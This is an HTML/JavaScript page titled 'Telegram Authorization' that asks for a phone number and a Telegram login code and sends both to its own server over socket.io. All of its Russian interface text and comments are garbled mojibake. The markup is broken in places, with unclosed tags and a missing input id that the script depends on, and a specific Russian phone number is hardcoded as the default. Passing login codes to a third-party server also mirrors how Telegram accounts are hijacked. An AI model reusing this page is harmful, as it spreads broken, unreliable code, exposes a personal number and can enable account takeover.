<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Authorization</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        .gradient-bg {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        
        .phone-digit-container {
            position: relative;
        }
        
        .phone-digit {
            width: 50px;
            height: 50px;
            border: 2px solid #e5e7eb;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            font-weight: 600;
            color: #374151;
            background: white;
            cursor: pointer;
            transition: all 0.3s ease;
            user-select: none;
            position: relative;
            overflow: hidden;
        }
        
        .phone-digit:hover {
            border-color: #3b82f6;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }
        
        .phone-digit.active {
            border-color: #3b82f6;
            background: #3b82f6;
            color: white;
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
        }
        
        .phone-digit.filled {
            border-color: #10b981;
            background: #10b981;
            color: white;
            animation: pulse 0.6s ease-in-out;
        }
        
        .phone-digit.error {
            border-color: #ef4444;
            background: #fef2f2;
            color: #dc2626;
            animation: shake 0.5s ease-in-out;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        
        .phone-digit::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.3) 50%, transparent 70%);
            transform: translateX(-100%);
            transition: transform 0.6s;
        }
        
        .phone-digit:hover::before {
            transform: translateX(100%);
        }
    </style>
</head>
<body class="gradient-bg min-h-screen flex items-center justify-center p-4">
    <div class="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md text-center">
        <!-- Logo -->
        <div class="w-20 h-20 bg-blue-500 rounded-full mx-auto mb-4 flex items-center justify-center text-2xl text-white">
            üì±
        </div>
        
        <h1 class="text-2xl font-bold text-gray-800 mb-6">Telegram Authorization</h1>
        
        <!-- Auth Form -->
        <div id="authForm" class="space-y-6">
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-4 text-center">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</label>
                
                <!-- Phone Input with Individual Digits -->
                <div class="flex justify-center items-center space-x-2 mb-4">
                    <div class="phone-digit-container">
                        <div class="phone-digit active">+</div>
                    </div>
                    <div class="phone-digit-container">
                        <div class="phone-digit" data-digit="7">7</div>
                    </div>
                    <div class="phone-digit-container">
                        <div class="phone-digit" data-digit="9">9</div>
                    </div>
                    <div class="phone-digit-container">
                        <div class="phone-digit" data-digit="8">8</div>
                    </div>
                    <div class="phone-digit-container">
                        <div class="phone-digit" data-digit="1">1</div>
                    </div>
                    <div class="phone-digit-container">
                        <div class="phone-digit" data-digit="7">7</div>
                    </div>
                    <div class="phone-digit-container">
                        <div class="phone-digit" data-digit="7">7</div>
                    </div>
                    <div class="phone-digit-container">
                        <div class="phone-digit" data-digit="5">5</div>
                    </div>
                    <div class="phone-digit-container">
                        <div class="phone-digit" data-digit="0">0</div>
                    </div>
                    <div class="phone-digit-container">
                        <div class="phone-digit" data-digit="0">0</div>
                    </div>
                    <div class="phone-digit-container">
                        <div class="phone-digit" data-digit="1">1</div>
                    </div>
                    <div class="phone-digit-container">
                        <div class="phone-digit" data-digit="8">8</div>
                    </div>
                </div>
                
                <!-- Hidden input for actual phone value -->
                <input 
                    type="tel" 
                    id="phoneInput" 
                    value="+79817750018"
                    class="hidden"
                >
                
                <!-- Manual input option -->
                <div class="mt-4">
                    <button 
                        id="manualInputBtn" 
                        class="text-sm text-blue-600 hover:text-blue-800 underline"

                <!-- Manual input field (hidden by default) -->
                <div id="manualInputContainer" class="hidden mt-4">
                    <input 
                        type="tel"

                    >

            </div>
            
            <button 
                id="authBtn" 
                class="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
            >
                –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è —á–µ—Ä–µ–∑ Telegram
            </button>
        </div>

        <!-- Code Form -->
        <div id="codeForm" class="hidden space-y-4">
            <div>
                <label for="codeInput" class="block text-sm font-medium text-gray-700 mb-2">–ö–æ–¥ –∏–∑ Telegram</label>
                <input 
                    type="text" 
                    id="codeInput" 
                    placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥" 
                    class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all"
                >
            </div>
            <div class="flex space-x-3">
                <button 
                    id="verifyBtn" 
                    class="flex-1 bg-green-500 hover:bg-green-600 text-white font-semibold py-3 px-6 rounded-lg transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                    –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∫–æ–¥
                </button>
                <button 
                    id="backBtn" 
                    class="flex-1 bg-gray-500 hover:bg-gray-600 text-white font-semibold py-3 px-6 rounded-lg transition-colors duration-200"
                >
                    –ù–∞–∑–∞–¥
                </button>
            </div>
        </div>

        <!-- User Info -->
        <div id="userInfo" class="hidden space-y-4">
            <div class="bg-green-50 border border-green-200 rounded-lg p-4">
                <h3 class="text-lg font-semibold text-green-800 mb-2">–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!</h3>
                <p id="userPhone" class="text-green-700"></p>
                <p id="userName" class="text-green-700"></p>
            </div>
            <div class="flex space-x-3">
                <button 
                    id="resetSessionBtn" 
                    class="flex-1 bg-yellow-500 hover:bg-yellow-600 text-white font-semibold py-3 px-6 rounded-lg transition-colors duration-200"
                >
                    –°–±—Ä–æ—Å —Å–µ—Å—Å–∏–∏
                </button>
                <button 
                    id="logoutBtn" 
                    class="flex-1 bg-red-500 hover:bg-red-600 text-white font-semibold py-3 px-6 rounded-lg transition-colors duration-200"
                >
                    –í—ã–π—Ç–∏
                </button>
            </div>
        </div>

        <!-- Status -->
        <div id="status" class="hidden mt-4 p-4 rounded-lg text-sm font-medium"></div>
    </div>

    <script>
        const socket = io();
        
        // DOM Elements
        const authForm = document.getElementById('authForm');
        const codeForm = document.getElementById('codeForm');
        const userInfo = document.getElementById('userInfo');
        const phoneInput = document.getElementById('phoneInput');
        const codeInput = document.getElementById('codeInput');
        const authBtn = document.getElementById('authBtn');
        const verifyBtn = document.getElementById('verifyBtn');
        const backBtn = document.getElementById('backBtn');
        const logoutBtn = document.getElementById('logoutBtn');
        const resetSessionBtn = document.getElementById('resetSessionBtn');
        const status = document.getElementById('status');
        const userPhone = document.getElementById('userPhone');
        const userName = document.getElementById('userName');

        let authKey = null;
        let currentPhone = null;
        let isWaitingForCode = false;
        let currentDigitIndex = 1; // Start from first digit after +
        let phoneDigits = ['+', '7', '9', '8', '1', '7', '7', '5', '0', '0', '1', '8'];

        // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è
        function saveState(phone, state) {
            const stateData = {
                phone: phone,
                state: state,
                timestamp: Date.now()
            };
            localStorage.setItem('authState', JSON.stringify(stateData));
                localStorage.setItem('authPhone', phone);
        }

        // –û—á–∏—Å—Ç–∫–∞ —Å–æ—Å—Ç–æ—è–Ω–∏—è
        function clearState() {
            localStorage.removeItem('authPhone');
            localStorage.removeItem('authState');
            localStorage.removeItem('sessionToken');
            currentPhone = null;
            isWaitingForCode = false;
        }

        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
        function formatPhoneNumber(input) {
            // –£–±–∏—Ä–∞–µ–º –≤—Å–µ –∫—Ä–æ–º–µ —Ü–∏—Ñ—Ä –∏ +
            let cleaned = input.replace(/[^\d+]/g, '');
            
            // –ï—Å–ª–∏ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å 8, –∑–∞–º–µ–Ω—è–µ–º –Ω–∞ +7
            if (cleaned.startsWith('8')) {
                cleaned = '+7' + cleaned.substring(1);
            }
            // –ï—Å–ª–∏ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å 7, –¥–æ–±–∞–≤–ª—è–µ–º +
            else if (cleaned.startsWith('7')) {
                cleaned = '+' + cleaned;
            }
            // –ï—Å–ª–∏ –Ω–µ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å +, –¥–æ–±–∞–≤–ª—è–µ–º +7
            else if (!cleaned.startsWith('+')) {
                cleaned = '+7' + cleaned;
            }
            
            return cleaned;
        }

        // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –Ω–æ–º–µ—Ä–∞
        function updatePhoneDisplay() {
            const phoneValue = phoneInput.value;
            const digits = phoneValue.split('');
            
            // –û–±–Ω–æ–≤–ª—è–µ–º –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Ü–∏—Ñ—Ä
            document.querySelectorAll('.phone-digit').forEach((digit, index) => {
                if (index < digits.length) {
                    digit.textContent = digits[index];
                    digit.classList.add('filled');
                    digit.classList.remove('error');
                } else {
                    digit.textContent = digit.dataset.digit || '';
                    digit.classList.remove('filled', 'active');
                }
            });
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ–≥–æ –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞
        function initPhoneInput() {
            const digitElements = document.querySelectorAll('.phone-digit');
            
            digitElements.forEach((digit, index) => {
                digit.addEventListener('click', () => {
                    if (index === 0) return; // –ù–µ –∫–ª–∏–∫–∞–µ–º –Ω–∞ +
                    
                    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∞–∫—Ç–∏–≤–Ω—É—é —Ü–∏—Ñ—Ä—É
                    digitElements.forEach(d => d.classList.remove('active'));
                    digit.classList.add('active');
                    currentDigitIndex = index;
                    
                    // –§–æ–∫—É—Å–∏—Ä—É–µ–º—Å—è –Ω–∞ —Ä—É—á–Ω–æ–º –≤–≤–æ–¥–µ
                    const manualInput = document.getElementById('manualPhoneInput');
                    if (manualInput) {
                        manualInput.focus();
                        manualInput.value = phoneInput.value;
                    }
                });
            });

            // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã
            document.addEventListener('keydown', (e) => {
                if (e.key >= '0' && e.key <= '9') {
                    e.preventDefault();
                    
                    if (currentDigitIndex < phoneDigits.length) {
                        phoneDigits[currentDigitIndex] = e.key;
                        phoneInput.value = phoneDigits.join('');
                        updatePhoneDisplay();
                        
                        // –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–π —Ü–∏—Ñ—Ä–µ
                        currentDigitIndex++;
                        if (currentDigitIndex < phoneDigits.length) {
                            digitElements.forEach(d => d.classList.remove('active'));
                            if (digitElements[currentDigitIndex]) {
                                digitElements[currentDigitIndex].classList.add('active');
                            }
                        }
                    }
                } else if (e.key === 'Backspace') {
                    e.preventDefault();
                    
                    if (currentDigitIndex > 1) {
                        currentDigitIndex--;
                        phoneDigits[currentDigitIndex] = phoneDigits[currentDigitIndex].replace(/\d/, '');
                        phoneInput.value = phoneDigits.join('');
                        updatePhoneDisplay();
                        
                        digitElements.forEach(d => d.classList.remove('active'));
                        if (digitElements[currentDigitIndex]) {
                            digitElements[currentDigitIndex].classList.add('active');
                        }
                    }
                }
            });
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å QR-–∫–æ–¥
        function showQRCode(qrCodeDataURL, link) {
            // –°–æ–∑–¥–∞–µ–º –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –¥–ª—è QR-–∫–æ–¥–∞
            const modal = document.createElement('div');
            modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
            modal.innerHTML = `
                <div class="bg-white rounded-2xl p-8 max-w-md mx-4 text-center">
                    <h3 class="text-xl font-bold mb-4">–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Telegram</h3>
                    <div class="mb-4">
                        <img src="${qrCodeDataURL}" alt="QR Code" class="mx-auto border rounded-lg">
                    </div>
                    <p class="text-sm text-gray-600 mb-4">–û—Ç—Å–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR-–∫–æ–¥ –∏–ª–∏ –ø–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ:</p>
                    <div class="bg-gray-100 p-3 rounded-lg mb-4">
                        <a href="${link}" target="_blank" class="text-blue-600 hover:text-blue-800 break-all">
                            ${link}
                        </a>
                    </div>
                    <button onclick="this.closest('.fixed').remove()" 
                            class="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors">
                        –ó–∞–∫—Ä—ã—Ç—å
                    </button>
                </div>
            `;
            document.body.appendChild(modal);
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å —Å—Å—ã–ª–∫—É –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        function showAuthLink(link) {
            const modal = document.createElement('div');
            modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
            modal.innerHTML = `
                <div class="bg-white rounded-2xl p-8 max-w-md mx-4 text-center">
                    <h3 class="text-xl font-bold mb-4">–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Telegram</h3>
                    <p class="text-sm text-gray-600 mb-4">–ü–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏:</p>
                    <div class="bg-gray-100 p-3 rounded-lg mb-4">
                        <a href="${link}" target="_blank" class="text-blue-600 hover:text-blue-800 break-all">
                            ${link}
                        </a>
                    </div>
                    <button onclick="this.closest('.fixed').remove()" 
                            class="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors">
                        –ó–∞–∫—Ä—ã—Ç—å
                    </button>
                </div>
            `;
            document.body.appendChild(modal);
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å —Ñ–æ—Ä–º—É –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        function showAuthForm() {
            authForm.classList.remove('hidden');
            codeForm.classList.add('hidden');
            userInfo.classList.add('hidden');
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å —Ñ–æ—Ä–º—É –∫–æ–¥–∞
        function showCodeForm() {
            authForm.classList.add('hidden');
            codeForm.classList.remove('hidden');
            userInfo.classList.add('hidden');
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        function showUserInfo() {
            authForm.classList.add('hidden');
            codeForm.classList.add('hidden');
            userInfo.classList.remove('hidden');
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å —Å—Ç–∞—Ç—É—Å
        function showStatus(message, type) {
            status.textContent = message;
            status.className = `mt-4 p-4 rounded-lg text-sm font-medium ${
                type === 'success' ? 'bg-green-100 text-green-800 border border-green-200' :
                type === 'error' ? 'bg-red-100 text-red-800 border border-red-200' :
                type === 'info' ? 'bg-blue-100 text-blue-800 border border-blue-200' :
                'bg-gray-100 text-gray-800 border border-gray-200'
            }`;
            status.classList.remove('hidden');
            
            if (type === 'success' || type === 'error') {
                setTimeout(() => {
                    status.classList.add('hidden');
                }, 5000);
            }
        }

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        authBtn.addEventListener('click', () => {
            const phone = phoneInput.value.trim();
            if (!phone) {
                showStatus('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞', 'error');
                return;
            }

            if (!phone.startsWith('+')) {
                showStatus('–ù–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å +', 'error');
                return;
            }
            
            authBtn.disabled = true;
            authBtn.textContent = '–û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–ø—Ä–æ—Å–∞...';

            socket.emit('requestAuth', { phone });
        });

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ä—É—á–Ω–æ–≥–æ –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞
        const manualInputBtn = document.getElementById('manualInputBtn');
        const manualInputContainer = document.getElementById('manualInputContainer');
        const manualPhoneInput = document.getElementById('manualPhoneInput');

        if (manualInputBtn && manualInputContainer && manualPhoneInput) {
            manualInputBtn.addEventListener('click', () => {
                manualInputContainer.classList.remove('hidden');
                manualPhoneInput.focus();
            });

            manualPhoneInput.addEventListener('input', (e) => {
                const formatted = formatPhoneNumber(e.target.value);
                e.target.value = formatted;
                phoneInput.value = formatted;
                updatePhoneDisplay();
            });
        }

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∫–æ–¥–∞
        verifyBtn.addEventListener('click', () => {
            const code = codeInput.value.trim();
            if (!code) {
                showStatus('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥', 'error');
                return;
            }
            
            verifyBtn.disabled = true;
            verifyBtn.textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞...';
            
            socket.emit('verifyCode', { 
                phone: currentPhone, 
                code: code 
            });
        });

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–∫–∏ "–ù–∞–∑–∞–¥"
        backBtn.addEventListener('click', () => {
            showAuthForm();
            clearState();
            showStatus('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏', 'info');
        });

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—ã—Ö–æ–¥–∞
        logoutBtn.addEventListener('click', () => {
            socket.emit('logout');
        });

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–±—Ä–æ—Å–∞ —Å–µ—Å—Å–∏–∏
        resetSessionBtn.addEventListener('click', () => {
            socket.emit('resetSession');
        });

        // Socket —Å–æ–±—ã—Ç–∏—è
        socket.on('authKey', (data) => {
            authKey = data.key;
            showStatus('–°—Å—ã–ª–∫–∞ –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ Telegram', 'info');
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º QR-–∫–æ–¥ –∏ —Å—Å—ã–ª–∫—É –µ—Å–ª–∏ –æ–Ω–∏ –µ—Å—Ç—å
            if (data.qrCode) {
                showQRCode(data.qrCode, data.link);
            } else if (data.link) {
                showAuthLink(data.link);
            }
            
            showCodeForm();
            currentPhone = phoneInput.value;
            isWaitingForCode = true;
            saveState(currentPhone, 'waitingForCode');
        });

        socket.on('authSuccess', (data) => {
            showStatus('–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞!', 'success');
            userPhone.textContent = `–¢–µ–ª–µ—Ñ–æ–Ω: ${data.phone}`;
            userName.textContent = `–ò–º—è: ${data.name || '–ù–µ —É–∫–∞–∑–∞–Ω–æ'}`;
            showUserInfo();
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ç–æ–∫–µ–Ω —Å–µ—Å—Å–∏–∏
            if (data.sessionToken) {
                localStorage.setItem('sessionToken', data.sessionToken);
            }
            
            clearState();
        });

        socket.on('authError', (data) => {
            showStatus(data.message || '–û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏', 'error');
            authBtn.disabled = false;
            authBtn.textContent = '–ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è —á–µ—Ä–µ–∑ Telegram';
            verifyBtn.disabled = false;
            verifyBtn.textContent = '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∫–æ–¥';
            
            // –ü—Ä–∏ –æ—à–∏–±–∫–µ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º—Å—è –∫ —Ñ–æ—Ä–º–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
            if (isWaitingForCode) {
                showAuthForm();
                clearState();
            }
        });

        socket.on('logoutSuccess', () => {
            showStatus('–í—ã –≤—ã—à–ª–∏ –∏–∑ —Å–∏—Å—Ç–µ–º—ã', 'info');
            authForm.classList.remove('hidden');
            userInfo.classList.add('hidden');
            phoneInput.value = '';
            authBtn.disabled = false;
            authBtn.textContent = '–ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è —á–µ—Ä–µ–∑ Telegram';
            
            // –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –ø—Ä–∏ –≤—ã—Ö–æ–¥–µ
            clearState();
        });

        socket.on('sessionReset', () => {
            showStatus('–°–µ—Å—Å–∏—è —Å–±—Ä–æ—à–µ–Ω–∞. –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏.', 'info');
            authForm.classList.add('hidden');
            userInfo.classList.add('hidden');
            codeForm.classList.remove('hidden');
            phoneInput.value = '';
            authBtn.disabled = false;
            authBtn.textContent = '–ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è —á–µ—Ä–µ–∑ Telegram';
            verifyBtn.disabled = false;
            verifyBtn.textContent = '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∫–æ–¥';
            
            // –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –ø—Ä–∏ —Å–±—Ä–æ—Å–µ —Å–µ—Å—Å–∏–∏
            clearState();
        });

        socket.on('alreadyAuthorized', (data) => {
            userPhone.textContent = `–¢–µ–ª–µ—Ñ–æ–Ω: ${data.phone}`;
            userName.textContent = `–ò–º—è: ${data.name || '–ù–µ —É–∫–∞–∑–∞–Ω–æ'}`;
            authForm.classList.add('hidden');
            codeForm.classList.add('hidden');
            userInfo.classList.remove('hidden');
            showStatus('–í—ã —É–∂–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã', 'success');
        });

        socket.on('sessionExpired', () => {
            showStatus('–°–µ—Å—Å–∏—è –∏—Å—Ç–µ–∫–ª–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∞–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ—Å—å –∑–∞–Ω–æ–≤–æ.', 'info');
            authForm.classList.remove('hidden');
            userInfo.classList.add('hidden');
            codeForm.classList.add('hidden');
            phoneInput.value = '';
            authBtn.disabled = false;
            authBtn.textContent = '–ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è —á–µ—Ä–µ–∑ Telegram';
            verifyBtn.disabled = false;
            verifyBtn.textContent = '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∫–æ–¥';
            
            // –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –ø—Ä–∏ —Å–±—Ä–æ—Å–µ —Å–µ—Å—Å–∏–∏
            clearState();
        });

        socket.on('smsCodeSent', (data) => {
            showStatus(`–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram –Ω–∞ –Ω–æ–º–µ—Ä ${data.phone}. –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –Ω–∏–∂–µ:`, 'info');
            saveState(data.phone, 'waitingForCode');
            showCodeForm();
        });

        socket.on('sessionExtended', (data) => {
            if (data.success) {
                console.log('–°–µ—Å—Å–∏—è —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ–¥–ª–µ–Ω–∞');
            } else {
                console.log('–ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ–¥–ª–∏—Ç—å —Å–µ—Å—Å–∏—é');
                // –ü—Ä–∏ –Ω–µ—É–¥–∞—á–Ω–æ–º –ø—Ä–æ–¥–ª–µ–Ω–∏–∏ –æ—á–∏—â–∞–µ–º —Å–µ—Å—Å–∏—é
                clearState();
                showAuthForm();
                showStatus('–°–µ—Å—Å–∏—è –∏—Å—Ç–µ–∫–ª–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∞–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ—Å—å –∑–∞–Ω–æ–≤–æ.', 'info');
            }
        });

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
        socket.on('connect_error', (error) => {
            showStatus('–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º', 'error');
        });

        socket.on('disconnect', () => {
            showStatus('–°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å —Å–µ—Ä–≤–µ—Ä–æ–º –ø–æ—Ç–µ—Ä—è–Ω–æ', 'error');
        });

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ—Å—Ç–æ—è–Ω–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', () => {
            // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π –≤–≤–æ–¥ –Ω–æ–º–µ—Ä–∞
            initPhoneInput();
            updatePhoneDisplay();
            
            const savedState = localStorage.getItem('authState');
            if (savedState) {
                try {
                    const stateData = JSON.parse(savedState);
                    const now = Date.now();
                    const stateAge = now - stateData.timestamp;
                    
                    // –ï—Å–ª–∏ —Å–æ—Å—Ç–æ—è–Ω–∏–µ —Å—Ç–∞—Ä—à–µ 10 –º–∏–Ω—É—Ç, –æ—á–∏—â–∞–µ–º –µ–≥–æ
                    if (stateAge > 10 * 60 * 1000) {
                        clearState();
                        return;
                    }
                    
                    if (stateData.state === 'waitingForCode') {
                        currentPhone = stateData.phone;
                        phoneInput.value = currentPhone;
                        showCodeForm();
                        showStatus('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram', 'info');
                    }
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è:', error);
                    clearState();
                }
            }
        });
    </script>
